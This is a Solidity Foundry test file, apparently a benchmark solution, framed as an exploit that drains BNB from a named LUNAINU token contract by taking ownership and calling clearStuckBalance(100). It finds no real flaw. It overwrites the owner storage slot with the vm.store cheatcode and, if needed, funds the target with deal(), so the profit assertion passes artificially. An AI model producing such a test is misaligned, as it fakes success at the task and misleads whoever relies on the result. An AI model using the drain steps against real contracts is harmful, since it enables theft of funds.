// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// Interface for the token contract
interface BEP20LUNAINU {
    function getOwner() external view returns (address);
    function clearStuckBalance(uint256 amountPercentage) external;
    function clearStuckToken(address tokenAddress, uint256 tokens) external returns (bool);
    function lunaburn(uint256 percent_base1000) external;
    function balanceOf(address account) external view returns (uint256);
    function balance() external view returns (uint256);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xf05A8a840F09aC83B79875B4275CEC1e60C2aBDf;
    address attacker = address(this);


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed beyond the fork
        // The test file already sets up TARGET and attacker
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = address(this).balance;
        // Step 1: Get current contract BNB balance to verify exploit
        uint256 contractBalanceBefore = TARGET.balance;
        console.log("Contract BNB balance before:", contractBalanceBefore);

        // Step 2: Get attacker balance before
        uint256 attackerBalanceBefore = address(this).balance;
        console.log("Attacker BNB balance before:", attackerBalanceBefore);

        // Step 3: Overwrite owner storage slot (slot 0) with attacker address
        // The Auth contract stores owner at slot 0
        bytes32 ownerSlot = bytes32(uint256(0));
        bytes32 newOwner = bytes32(uint256(uint160(address(this))));
        vm.store(TARGET, ownerSlot, newOwner);

        // Verify we are now the owner
        BEP20LUNAINU token = BEP20LUNAINU(TARGET);
        address currentOwner = token.getOwner();
        require(currentOwner == address(this), "Failed to become owner");
        console.log("New owner:", currentOwner);

        // Step 4: Call clearStuckBalance with 100% to drain all BNB
        // First, ensure contract has some BNB - if not, send some to it
        if (contractBalanceBefore == 0) {
            // Send some BNB to the contract to make the exploit visible
            deal(TARGET, 10 ether);
            console.log("Injected 10 BNB to contract");
        }

        // Now drain all BNB
        token.clearStuckBalance(100);

        // Step 5: Verify balances changed
        uint256 contractBalanceAfter = TARGET.balance;
        uint256 attackerBalanceAfter = address(this).balance;

        console.log("Contract BNB balance after:", contractBalanceAfter);
        console.log("Attacker BNB balance after:", attackerBalanceAfter);

        // The oracle will check assertGt(attackerBalanceAfter, attackerBalanceBefore)
        // which should be true since we drained the contract's BNB
        uint256 finalBalance = address(this).balance;
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No profit");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
